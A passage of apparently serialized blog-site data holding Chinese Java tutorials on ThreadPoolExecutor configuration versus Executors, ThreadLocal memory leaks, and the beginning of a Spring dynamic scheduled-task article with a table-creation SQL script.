这个强大的线程池工具类，我们创造线程池只需调用某个方法即可，比如Executors.newFixedThreadPool(int nThreads)，但是便捷不仅隐藏了复杂性，也为我们埋下了潜在的隐患（OOM，线程耗尽）。\n\n * 而强大的 Executors 在创建线程池时，也只是依赖ThreadPoolExecutor类，修改其中几个方法参数而已。\n\n * 同时，在阿里规范中也明确【强制】指出 通过 ThreadPoolExecutor 创建线程池。\n   \n   1. 【强制】创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。 正例：\n   \n   public class TimerTaskThread extends Thread {\n       public TimerTaskThread(){\n           super.setName("TimerTaskThread"); \n           ...\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   2. 【强制】线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。 说明： 使用线程池的好处是减少在创建和销毁线程上所花的时间以及系统资源的开销，解决资 源不足的问题。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者 “过度切换”的问题。\n   \n   3. 【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样 的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。\n\n\n# 初识Executors\n\n1. Executors.newCachedThreadPool(); 说明: 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程. 内部实现：\n\n// 无界线程池\npublic static ExecutorService newCachedThreadPool() {\n    return new ThreadPoolExecutor(0, Integer.MAX_VALUE,\n                                  60L, TimeUnit.SECONDS,\n                                  new SynchronousQueue<Runnable>());\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. Executors.newFixedThreadPool(int); 说明: 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。 内部实现：\n\n// 固定大小线程池\npublic static ExecutorService newFixedThreadPool(int nThreads) {\n    return new ThreadPoolExecutor(nThreads, nThreads,\n                                  0L, TimeUnit.MILLISECONDS,\n                                  new LinkedBlockingQueue<Runnable>());\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n3. Executors.newSingleThreadExecutor(); 说明:创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照顺序执行。 内部实现：\n\n// 单个后台线程\npublic static ExecutorService newSingleThreadExecutor() {\n    return new FinalizableDelegatedExecutorService\n        (new ThreadPoolExecutor(1, 1,\n                                0L, TimeUnit.MILLISECONDS,\n                                new LinkedBlockingQueue<Runnable>()));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n4. Executors.newScheduledThreadPool(int); 说明:创建一个定长线程池，支持定时及周期性任务执行。 内部实现：\n\nnew ScheduledThreadPoolExecutor(corePoolSize)\n\n\n1\n\n\n\n# 步入ThreadPoolExecutor\n\n * 核心参数\n\n// Java线程池的完整构造函数\npublic ThreadPoolExecutor(\n  int corePoolSize, // 线程池长期维持的线程数，即使线程处于Idle状态，也不会回收。\n  int maximumPoolSize, // 线程数的上限\n  long keepAliveTime, TimeUnit unit, // 超过corePoolSize的线程的idle时长，\n                                     // 时长的单位\n  BlockingQueue<Runnable> workQueue, // 任务的排队队列\n  ThreadFactory threadFactory, // 新线程的产生方式\n  RejectedExecutionHandler handler) // 拒绝策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n参数                说明\ncorePoolSize      核心线程数量，线程池维护线程的最少数量\nmaximumPoolSize   线程池维护线程的最大数量\nkeepAliveTime     线程池除核心线程外的其他线程的最长空闲时间，超过该时间的空闲线程会被销毁\nunit              keepAliveTime的单位，TimeUnit中的几个静态属性：NANOSECONDS、MICROSECONDS、MILLISECONDS、SECONDS\nworkQueue         线程池所使用的任务缓冲队列\nthreadFactory     线程工厂，用于创建线程，一般用默认的即可\nhandler           线程池对拒绝任务的处理策略\n\n\n# handler拒绝策略\n\n当线程池任务处理不过来的时候，可以通过handler指定的策略进行处理，ThreadPoolExecutor提供了四种策略：\n\n 1. ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常；也是默认的处理方式。\n 2. ThreadPoolExecutor.DiscardPolicy：丢弃任务，但是不抛出异常。\n 3. ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）。\n 4. ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务\n\n可以通过实现RejectedExecutionHandler接口自定义处理方式。\n\n\n# workQueue任务队列\n\n 1. ArrayBlockingQueue： 这是一个由数组实现的容量固定的有界阻塞队列。\n 2. SynchronousQueue： 没有容量，不能缓存数据；每个put必须等待一个take; offer()的时候如果没有另一个线程在poll()或者take()的话返回false。\n 3. LinkedBlockingQueue： 这是一个由单链表实现的默认×××的阻塞队列。LinkedBlockingQueue提供了一个可选有界的构造函数，而在未指明容量时，容量默认为Integer.MAX_VALUE。\n\n\n# 线程池的工作顺序\n\n * corePoolSize -> workQueue 任务队列 -> maximumPoolSize -> handler 拒绝策略\n   \n   跟银行类似：有2个窗口（corePoolSize）办理业务，有人来了就先到候客区（workQueue）等着，候客区如果满了就再多开几个窗口（maximumPoolSize）办理业务，如果候客区和能开的窗口都满了，那保安就拒绝（handler）别人再进入银行。业务办理的差不多了，多开的窗口等待一定时间（keepAliveTime ）还没有人办理业务，那就把它关了吧浪费。\n\n\n# Executors弊端\n\n 1. FixedThreadPool 和 SingleThreadPool:\n    \n    允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。\n\n 2. CachedThreadPool 和 ScheduledThreadPool:\n    \n    允许的创建线程数量为 Integer.MAX_VALUE， 可能会创建大量的线程，从而导致 OOM。\n\n\n# 正确的使用线程池\n\n// 返回可用处理器的Java虚拟机的数量(获取本机cpu核心数)\nint poolSize = Runtime.getRuntime().availableProcessors() * 2;\n// 使用有界队列，避免OOM\nBlockingQueue<Runnable> queue = new ArrayBlockingQueue<>(512);\n// 指定拒绝策略\nRejectedExecutionHandler policy = new ThreadPoolExecutor.DiscardPolicy();\n\n//自定义的线程池\nExecutorService executorService = new ThreadPoolExecutor(poolSize, poolSize,\n    0, TimeUnit.SECONDS,queue,policy);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 线程超时时间\n\n * 单个任务的超时时间\n\nV Future.get(long timeout, TimeUnit unit)方法可以指定等待的超时时间，超时未完成会抛出TimeoutException。\n\n * 多个任务的超时时间\n\n等待多个任务完成，并设置最大等待时间，可以通过CountDownLatch完成：\n\npublic void testLatch(ExecutorService executorService, List<Runnable> tasks) \n    throws InterruptedException{\n      \n    CountDownLatch latch = new CountDownLatch(tasks.size());\n      for(Runnable r : tasks){\n          executorService.submit(new Runnable() {\n              @Override\n              public void run() {\n                  try{\n                      r.run();\n                  }finally {\n                      latch.countDown();// countDown\n                  }\n              }\n          });\n      }\n      latch.await(10, TimeUnit.SECONDS); // 指定超时时间\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',normalizedContent:' * 前言\n * 初识executors\n * 步入threadpoolexecutor\n   * handler拒绝策略\n   * workqueue任务队列\n * 线程池的工作顺序\n * executors弊端\n * 正确的使用线程池\n   * 线程超时时间\n\n\n\n\n# 前言\n\n * java中创建线程池很简单，java提供了 executors 这个强大的线程池工具类，我们创造线程池只需调用某个方法即可，比如executors.newfixedthreadpool(int nthreads)，但是便捷不仅隐藏了复杂性，也为我们埋下了潜在的隐患（oom，线程耗尽）。\n\n * 而强大的 executors 在创建线程池时，也只是依赖threadpoolexecutor类，修改其中几个方法参数而已。\n\n * 同时，在阿里规范中也明确【强制】指出 通过 threadpoolexecutor 创建线程池。\n   \n   1. 【强制】创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。 正例：\n   \n   public class timertaskthread extends thread {\n       public timertaskthread(){\n           super.setname("timertaskthread"); \n           ...\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   2. 【强制】线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。 说明： 使用线程池的好处是减少在创建和销毁线程上所花的时间以及系统资源的开销，解决资 源不足的问题。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者 “过度切换”的问题。\n   \n   3. 【强制】线程池不允许使用 executors 去创建，而是通过 threadpoolexecutor 的方式，这样 的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。\n\n\n# 初识executors\n\n1. executors.newcachedthreadpool(); 说明: 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程. 内部实现：\n\n// 无界线程池\npublic static executorservice newcachedthreadpool() {\n    return new threadpoolexecutor(0, integer.max_value,\n                                  60l, timeunit.seconds,\n                                  new synchronousqueue<runnable>());\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. executors.newfixedthreadpool(int); 说明: 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。 内部实现：\n\n// 固定大小线程池\npublic static executorservice newfixedthreadpool(int nthreads) {\n    return new threadpoolexecutor(nthreads, nthreads,\n                                  0l, timeunit.milliseconds,\n                                  new linkedblockingqueue<runnable>());\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n3. executors.newsinglethreadexecutor(); 说明:创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照顺序执行。 内部实现：\n\n// 单个后台线程\npublic static executorservice newsinglethreadexecutor() {\n    return new finalizabledelegatedexecutorservice\n        (new threadpoolexecutor(1, 1,\n                                0l, timeunit.milliseconds,\n                                new linkedblockingqueue<runnable>()));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n4. executors.newscheduledthreadpool(int); 说明:创建一个定长线程池，支持定时及周期性任务执行。 内部实现：\n\nnew scheduledthreadpoolexecutor(corepoolsize)\n\n\n1\n\n\n\n# 步入threadpoolexecutor\n\n * 核心参数\n\n// java线程池的完整构造函数\npublic threadpoolexecutor(\n  int corepoolsize, // 线程池长期维持的线程数，即使线程处于idle状态，也不会回收。\n  int maximumpoolsize, // 线程数的上限\n  long keepalivetime, timeunit unit, // 超过corepoolsize的线程的idle时长，\n                                     // 时长的单位\n  blockingqueue<runnable> workqueue, // 任务的排队队列\n  threadfactory threadfactory, // 新线程的产生方式\n  rejectedexecutionhandler handler) // 拒绝策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n参数                说明\ncorepoolsize      核心线程数量，线程池维护线程的最少数量\nmaximumpoolsize   线程池维护线程的最大数量\nkeepalivetime     线程池除核心线程外的其他线程的最长空闲时间，超过该时间的空闲线程会被销毁\nunit              keepalivetime的单位，timeunit中的几个静态属性：nanoseconds、microseconds、milliseconds、seconds\nworkqueue         线程池所使用的任务缓冲队列\nthreadfactory     线程工厂，用于创建线程，一般用默认的即可\nhandler           线程池对拒绝任务的处理策略\n\n\n# handler拒绝策略\n\n当线程池任务处理不过来的时候，可以通过handler指定的策略进行处理，threadpoolexecutor提供了四种策略：\n\n 1. threadpoolexecutor.abortpolicy:丢弃任务并抛出rejectedexecutionexception异常；也是默认的处理方式。\n 2. threadpoolexecutor.discardpolicy：丢弃任务，但是不抛出异常。\n 3. threadpoolexecutor.discardoldestpolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）。\n 4. threadpoolexecutor.callerrunspolicy：由调用线程处理该任务\n\n可以通过实现rejectedexecutionhandler接口自定义处理方式。\n\n\n# workqueue任务队列\n\n 1. arrayblockingqueue： 这是一个由数组实现的容量固定的有界阻塞队列。\n 2. synchronousqueue： 没有容量，不能缓存数据；每个put必须等待一个take; offer()的时候如果没有另一个线程在poll()或者take()的话返回false。\n 3. linkedblockingqueue： 这是一个由单链表实现的默认×××的阻塞队列。linkedblockingqueue提供了一个可选有界的构造函数，而在未指明容量时，容量默认为integer.max_value。\n\n\n# 线程池的工作顺序\n\n * corepoolsize -> workqueue 任务队列 -> maximumpoolsize -> handler 拒绝策略\n   \n   跟银行类似：有2个窗口（corepoolsize）办理业务，有人来了就先到候客区（workqueue）等着，候客区如果满了就再多开几个窗口（maximumpoolsize）办理业务，如果候客区和能开的窗口都满了，那保安就拒绝（handler）别人再进入银行。业务办理的差不多了，多开的窗口等待一定时间（keepalivetime ）还没有人办理业务，那就把它关了吧浪费。\n\n\n# executors弊端\n\n 1. fixedthreadpool 和 singlethreadpool:\n    \n    允许的请求队列长度为 integer.max_value，可能会堆积大量的请求，从而导致 oom。\n\n 2. cachedthreadpool 和 scheduledthreadpool:\n    \n    允许的创建线程数量为 integer.max_value， 可能会创建大量的线程，从而导致 oom。\n\n\n# 正确的使用线程池\n\n// 返回可用处理器的java虚拟机的数量(获取本机cpu核心数)\nint poolsize = runtime.getruntime().availableprocessors() * 2;\n// 使用有界队列，避免oom\nblockingqueue<runnable> queue = new arrayblockingqueue<>(512);\n// 指定拒绝策略\nrejectedexecutionhandler policy = new threadpoolexecutor.discardpolicy();\n\n//自定义的线程池\nexecutorservice executorservice = new threadpoolexecutor(poolsize, poolsize,\n    0, timeunit.seconds,queue,policy);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 线程超时时间\n\n * 单个任务的超时时间\n\nv future.get(long timeout, timeunit unit)方法可以指定等待的超时时间，超时未完成会抛出timeoutexception。\n\n * 多个任务的超时时间\n\n等待多个任务完成，并设置最大等待时间，可以通过countdownlatch完成：\n\npublic void testlatch(executorservice executorservice, list<runnable> tasks) \n    throws interruptedexception{\n      \n    countdownlatch latch = new countdownlatch(tasks.size());\n      for(runnable r : tasks){\n          executorservice.submit(new runnable() {\n              @override\n              public void run() {\n                  try{\n                      r.run();\n                  }finally {\n                      latch.countdown();// countdown\n                  }\n              }\n          });\n      }\n      latch.await(10, timeunit.seconds); // 指定超时时间\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"线程池 - 简介",frontmatter:{title:"线程池 - 简介",date:"2020-03-31T00:00:00.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/ThreadLocal.html",relativePath:"views/backend/ThreadLocal.md",key:"v-27b64db4",path:"/views/backend/ThreadLocal.html",headers:[{level:2,title:"适用场景",slug:"适用场景",normalizedTitle:"适用场景",charIndex:3},{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:11},{level:2,title:"实例",slug:"实例",normalizedTitle:"实例",charIndex:17},{level:2,title:"ThreadLocalMap与内存泄漏",slug:"threadlocalmap与内存泄漏",normalizedTitle:"threadlocalmap与内存泄漏",charIndex:23},{level:3,title:"防止内存泄露",slug:"防止内存泄露",normalizedTitle:"防止内存泄露",charIndex:48},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:58},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:64}],headersStr:"适用场景 简介 实例 ThreadLocalMap与内存泄漏 防止内存泄露 总结 参考",content:' * 适用场景\n * 简介\n * 实例\n * ThreadLocalMap与内存泄漏\n   * 防止内存泄露\n * 总结\n * 参考\n\n\n\n\n# 适用场景\n\n * 每个线程需要有自己单独的实例\n * 实例需要在多个方法中共享，但不希望被多线程共享\n * 线程间数据隔离，数据库连接，Session会话管理。\n\n每个线程都对应一个ThreadLocalMap, 而Threadlocal负责访问和维护ThreadLocalMap。 set()方法就是把Threadlocal插入当前Thread维护的ThreadLocalMap中，如果你在线程1里面去set()，那么你在线程2里面去获取的时候，它取得是线程2的ThreadLocalMap，但是线程2里面的ThreadLocalMap并没有插入ThreadLocal。\n\n\n# 简介\n\nThreadLocal的目的是为了解决多线程访问资源时的共享问题 。\n\n可以把ThreadLocal看成一个全局Map：每个线程获取ThreadLocal变量时，总是使用Thread自身作为key。\n\nThreadLocal 变量通常被private static修饰。 ThreadLocal 提供了线程本地的实例。它与普通变量的区别在于，每个使用该变量的线程都会初始化一个完全独立的实例副本。\n\n也就是说，不管你有多少个线程，ThreadLocal 相当于在每一个线程中映射一个副本，各线程间只会访问自己线程的ThreadLocal 。\n\n\n# 实例\n\n代码示例（点击展开）\n\npublic class TestThreadLocal {\n    private static ThreadLocal<Long> longLocal = new ThreadLocal<Long>();\n    private static ThreadLocal<String> stringLocal = new ThreadLocal<String>(){\n        /* 1. ThreadLocal 设置默认值的方式 */\n        protected String initialValue() {\n            return Thread.currentThread().getName();\n        };\n    };\n \n    public void set() {\n        /* 2. ThreadLocal 赋值方式 */\n        longLocal.set(Thread.currentThread().getId());\n        // stringLocal.set(Thread.currentThread().getName());\n    }\n     \n    public long getLong() {\n        /* 3. ThreadLocal 取值方式 */\n        return longLocal.get();\n    }\n     \n    public String getString() {\n        return stringLocal.get();\n    }\n     \n    public static void main(String[] args) throws InterruptedException {\n        final TestThreadLocal test = new TestThreadLocal();\n         \n        //当前线程\n        test.set();\n        System.out.println("main线程：  " + test.getLong());\n        System.out.println("main线程：  " + test.getString());\n \n        Thread thread1 = new Thread(){\n            public void run() {\n                //其它线程\n                test.set();\n                System.out.println("新线程：  " + test.getLong());\n                System.out.println("新线程：  " + test.getString());\n            };\n        };\n        thread1.start();\n        thread1.join();\n         \n        //当前线程\n        System.out.println("main线程：  " + test.getLong());\n        System.out.println("main线程：  " + test.getString());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# ThreadLocalMap与内存泄漏\n\n该方案中，Map 由 ThreadLocal 类的静态内部类 ThreadLocalMap 提供。该类的实例维护某个 ThreadLocal 与具体实例的映射。与 HashMap 不同的是，ThreadLocalMap 的每个 Entry 都是一个对 *键* 的弱引用，这一点从super(k)可看出。另外，每个 Entry 都包含了一个对 *值* 的强引用。\n\nstatic class Entry extends WeakReference<ThreadLocal<?>> {  \n    /** The value associated with this ThreadLocal. */  \n    Object value;  \n    Entry(ThreadLocal<?> k, Object v) {    \n        super(k);    \n        value = v;  \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n使用弱引用的原因在于，当没有强引用指向 ThreadLocal 变量时，它可被回收，从而避免上文所述 ThreadLocal 不能被回收而造成的内存泄漏的问题。\n\n但是，这里又可能出现另外一种内存泄漏的问题。ThreadLocalMap 维护 ThreadLocal 变量与具体实例的映射，当 ThreadLocal 变量被回收后，该映射的键变为 null，该 Entry 无法被移除。从而使得实例被该 Entry 引用而无法被回收造成内存泄漏。\n\n注：Entry虽然是弱引用，但它是 ThreadLocal 类型的弱引用（也即上文所述它是对 *键* 的弱引用），而非具体实例的的弱引用，所以无法避免具体实例相关的内存泄漏。\n\n\n# 防止内存泄露\n\n 1. 特别注意ThreadLocal一定要在finally中清除：\n\ntry {\n    threadLocalUser.set(user);\n    ...\n} finally {\n    threadLocalUser.remove();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n这是因为当前线程执行完相关代码后，很可能会被重新放入线程池中，如果ThreadLocal没有被清除，该线程执行其他代码时，会把上一次的状态带进去。\n\n 2. 为了保证能释放ThreadLocal关联的实例，我们可以通过AutoCloseable接口配合try (resource) {...}结构，让编译器自动为我们关闭。例如，一个保存了当前用户名的ThreadLocal可以封装为一个UserContext对象：\n\npublic class UserContext implements AutoCloseable {\n\n    static final ThreadLocal<String> ctx = new ThreadLocal<>();\n\n    public UserContext(String user) {\n        ctx.set(user);\n    }\n\n    public static String currentUser() {\n        return ctx.get();\n    }\n\n    @Override\n    public void close() {\n        ctx.remove();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n使用的时候，我们借助try (resource) {...}结构，可以这么写：\n\ntry (var ctx = new UserContext("Bob")) {\n    // 可任意调用UserContext.currentUser():\n    String currentUser = UserContext.currentUser();\n} // 在此自动调用UserContext.close()方法释放ThreadLocal关联对象\n\n\n1\n2\n3\n4\n\n\n这样就在UserContext中完全封装了ThreadLocal，外部代码在try (resource) {...}内部可以随时调用UserContext.currentUser()获取当前线程绑定的用户名。\n\n\n# 总结\n\n * ThreadLocal 并不解决线程间共享数据的问题\n * ThreadLocal 通过隐式的在不同线程内创建独立实例副本避免了实例线程安全的问题\n * 每个线程持有一个 Map 并维护了 ThreadLocal 对象与具体实例的映射，该 Map 由于只被持有它的线程访问，故不存在线程安全以及锁的问题\n * ThreadLocalMap 的 Entry 对 ThreadLocal 的引用为弱引用，避免了 ThreadLocal 对象无法被回收的问题\n * ThreadLocalMap 的 set 方法通过调用 replaceStaleEntry 方法回收键为 null 的 Entry 对象的值（即为具体实例）以及 Entry 对象本身从而防止内存泄漏\n * ThreadLocal 适用于变量在线程间隔离且在方法间共享的场景\n\n\n# 参考\n\nhttp://www.jasongj.com/java/threadlocal/\n\nhttps://droidyue.com/blog/2016/03/13/learning-threadlocal-in-java/\n\nThreadLocal内存泄漏问题\n\n廖雪峰的官方网站',normalizedContent:' * 适用场景\n * 简介\n * 实例\n * threadlocalmap与内存泄漏\n   * 防止内存泄露\n * 总结\n * 参考\n\n\n\n\n# 适用场景\n\n * 每个线程需要有自己单独的实例\n * 实例需要在多个方法中共享，但不希望被多线程共享\n * 线程间数据隔离，数据库连接，session会话管理。\n\n每个线程都对应一个threadlocalmap, 而threadlocal负责访问和维护threadlocalmap。 set()方法就是把threadlocal插入当前thread维护的threadlocalmap中，如果你在线程1里面去set()，那么你在线程2里面去获取的时候，它取得是线程2的threadlocalmap，但是线程2里面的threadlocalmap并没有插入threadlocal。\n\n\n# 简介\n\nthreadlocal的目的是为了解决多线程访问资源时的共享问题 。\n\n可以把threadlocal看成一个全局map：每个线程获取threadlocal变量时，总是使用thread自身作为key。\n\nthreadlocal 变量通常被private static修饰。 threadlocal 提供了线程本地的实例。它与普通变量的区别在于，每个使用该变量的线程都会初始化一个完全独立的实例副本。\n\n也就是说，不管你有多少个线程，threadlocal 相当于在每一个线程中映射一个副本，各线程间只会访问自己线程的threadlocal 。\n\n\n# 实例\n\n代码示例（点击展开）\n\npublic class testthreadlocal {\n    private static threadlocal<long> longlocal = new threadlocal<long>();\n    private static threadlocal<string> stringlocal = new threadlocal<string>(){\n        /* 1. threadlocal 设置默认值的方式 */\n        protected string initialvalue() {\n            return thread.currentthread().getname();\n        };\n    };\n \n    public void set() {\n        /* 2. threadlocal 赋值方式 */\n        longlocal.set(thread.currentthread().getid());\n        // stringlocal.set(thread.currentthread().getname());\n    }\n     \n    public long getlong() {\n        /* 3. threadlocal 取值方式 */\n        return longlocal.get();\n    }\n     \n    public string getstring() {\n        return stringlocal.get();\n    }\n     \n    public static void main(string[] args) throws interruptedexception {\n        final testthreadlocal test = new testthreadlocal();\n         \n        //当前线程\n        test.set();\n        system.out.println("main线程：  " + test.getlong());\n        system.out.println("main线程：  " + test.getstring());\n \n        thread thread1 = new thread(){\n            public void run() {\n                //其它线程\n                test.set();\n                system.out.println("新线程：  " + test.getlong());\n                system.out.println("新线程：  " + test.getstring());\n            };\n        };\n        thread1.start();\n        thread1.join();\n         \n        //当前线程\n        system.out.println("main线程：  " + test.getlong());\n        system.out.println("main线程：  " + test.getstring());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# threadlocalmap与内存泄漏\n\n该方案中，map 由 threadlocal 类的静态内部类 threadlocalmap 提供。该类的实例维护某个 threadlocal 与具体实例的映射。与 hashmap 不同的是，threadlocalmap 的每个 entry 都是一个对 *键* 的弱引用，这一点从super(k)可看出。另外，每个 entry 都包含了一个对 *值* 的强引用。\n\nstatic class entry extends weakreference<threadlocal<?>> {  \n    /** the value associated with this threadlocal. */  \n    object value;  \n    entry(threadlocal<?> k, object v) {    \n        super(k);    \n        value = v;  \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n使用弱引用的原因在于，当没有强引用指向 threadlocal 变量时，它可被回收，从而避免上文所述 threadlocal 不能被回收而造成的内存泄漏的问题。\n\n但是，这里又可能出现另外一种内存泄漏的问题。threadlocalmap 维护 threadlocal 变量与具体实例的映射，当 threadlocal 变量被回收后，该映射的键变为 null，该 entry 无法被移除。从而使得实例被该 entry 引用而无法被回收造成内存泄漏。\n\n注：entry虽然是弱引用，但它是 threadlocal 类型的弱引用（也即上文所述它是对 *键* 的弱引用），而非具体实例的的弱引用，所以无法避免具体实例相关的内存泄漏。\n\n\n# 防止内存泄露\n\n 1. 特别注意threadlocal一定要在finally中清除：\n\ntry {\n    threadlocaluser.set(user);\n    ...\n} finally {\n    threadlocaluser.remove();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n这是因为当前线程执行完相关代码后，很可能会被重新放入线程池中，如果threadlocal没有被清除，该线程执行其他代码时，会把上一次的状态带进去。\n\n 2. 为了保证能释放threadlocal关联的实例，我们可以通过autocloseable接口配合try (resource) {...}结构，让编译器自动为我们关闭。例如，一个保存了当前用户名的threadlocal可以封装为一个usercontext对象：\n\npublic class usercontext implements autocloseable {\n\n    static final threadlocal<string> ctx = new threadlocal<>();\n\n    public usercontext(string user) {\n        ctx.set(user);\n    }\n\n    public static string currentuser() {\n        return ctx.get();\n    }\n\n    @override\n    public void close() {\n        ctx.remove();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n使用的时候，我们借助try (resource) {...}结构，可以这么写：\n\ntry (var ctx = new usercontext("bob")) {\n    // 可任意调用usercontext.currentuser():\n    string currentuser = usercontext.currentuser();\n} // 在此自动调用usercontext.close()方法释放threadlocal关联对象\n\n\n1\n2\n3\n4\n\n\n这样就在usercontext中完全封装了threadlocal，外部代码在try (resource) {...}内部可以随时调用usercontext.currentuser()获取当前线程绑定的用户名。\n\n\n# 总结\n\n * threadlocal 并不解决线程间共享数据的问题\n * threadlocal 通过隐式的在不同线程内创建独立实例副本避免了实例线程安全的问题\n * 每个线程持有一个 map 并维护了 threadlocal 对象与具体实例的映射，该 map 由于只被持有它的线程访问，故不存在线程安全以及锁的问题\n * threadlocalmap 的 entry 对 threadlocal 的引用为弱引用，避免了 threadlocal 对象无法被回收的问题\n * threadlocalmap 的 set 方法通过调用 replacestaleentry 方法回收键为 null 的 entry 对象的值（即为具体实例）以及 entry 对象本身从而防止内存泄漏\n * threadlocal 适用于变量在线程间隔离且在方法间共享的场景\n\n\n# 参考\n\nhttp://www.jasongj.com/java/threadlocal/\n\nhttps://droidyue.com/blog/2016/03/13/learning-threadlocal-in-java/\n\nthreadlocal内存泄漏问题\n\n廖雪峰的官方网站',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring 定时任务添加开关，修改cron不用重启",frontmatter:{title:"Spring 定时任务添加开关，修改cron不用重启",date:"2021-11-22T00:00:00.000Z",tags:["定时任务"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/SchedulingConfigurer.html",relativePath:"views/backend/SchedulingConfigurer.md",key:"v-00fd7970",path:"/views/backend/SchedulingConfigurer.html",headers:[{level:3,title:"修改定时任务不重启项目，SpringBoot如何实现？",slug:"修改定时任务不重启项目-springboot如何实现",normalizedTitle:"修改定时任务不重启项目，springboot如何实现？",charIndex:3},{level:3,title:"1、建表 管理定时任务",slug:"_1、建表-管理定时任务",normalizedTitle:"1、建表 管理定时任务",charIndex:34},{level:3,title:"2、代码实现",slug:"_2、代码实现",normalizedTitle:"2、代码实现",charIndex:49},{level:3,title:"3、效果展示",slug:"_3、效果展示",normalizedTitle:"3、效果展示",charIndex:59},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:69},{level:3,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:75}],headersStr:"修改定时任务不重启项目，SpringBoot如何实现？ 1、建表 管理定时任务 2、代码实现 3、效果展示 总结 参考",content:' * 修改定时任务不重启项目，SpringBoot如何实现？\n * 1、建表 管理定时任务\n * 2、代码实现\n * 3、效果展示\n * 总结\n * 参考\n\n\n\n\n# 修改定时任务不重启项目，SpringBoot如何实现？\n\n业务场景描述：定时任务的任务名称，cron（定时任务表达式），定时任务开关，存储在数据库表中。在不重启项目的情况下，修改定时任务表达式，可以实时获取新的定时任务执行时间规则；修改定时任务执行状态，可以随时开关定时任务。\n\n使用技术：基于接口 SchedulingConfigurer\n\n\n# 1、建表 管理定时任务\n\nDROP TABLE IF EXISTS `scheduled_cron`;\nCREATE TABLE `scheduled` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `name` varchar(20) DEFAULT NULL,\n  `cron` varchar(30) DEFAULT NULL,\n  `description` varchar(30) DEFAULT NULL COMMENT \'描述\',\n  `create_user` varchar(30) DEFAULT NULL COMMENT \'创建人\',\n  `status` tinyint(1) DEFAULT NULL COMMENT \'1开启， 0关闭\',\n  `create_time` datetime DEFAULT NULL COMMENT \'创建时间\',\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \n-- ----------------------------\n-- Records of scheduled\n-- ----------------------------\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 